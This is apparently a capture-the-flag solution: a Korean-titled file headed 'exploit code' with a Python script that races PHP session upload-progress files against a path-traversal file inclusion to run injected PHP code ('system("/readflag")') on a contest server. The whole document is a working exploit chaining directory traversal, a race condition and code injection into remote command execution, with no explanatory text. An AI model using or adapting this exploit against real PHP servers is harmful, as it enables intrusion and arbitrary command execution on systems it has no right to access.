# 익스플로잇 코드
```py
import threading
import requests

url = "http://apb2023.cstec.kr:8000"

def session1():
    while True:
        query = url + "/?page=" + "../" * 10 + "var/lib/php/sessions/sess_test"
        res = requests.get(query)
        if len(res.text) != 0:
            print(res.text)
            exit()

def session2():
    while True:
        res = requests.post(url, files={
            'PHP_SESSION_UPLOAD_PROGRESS': (None, '<?php system("/readflag"); ?>'),
            'file': ('test', 'asdf')
        }, cookies={'PHPSESSID': 'test'})

threading.Thread(target=session1).start()
threading.Thread(target=session2).start()
```
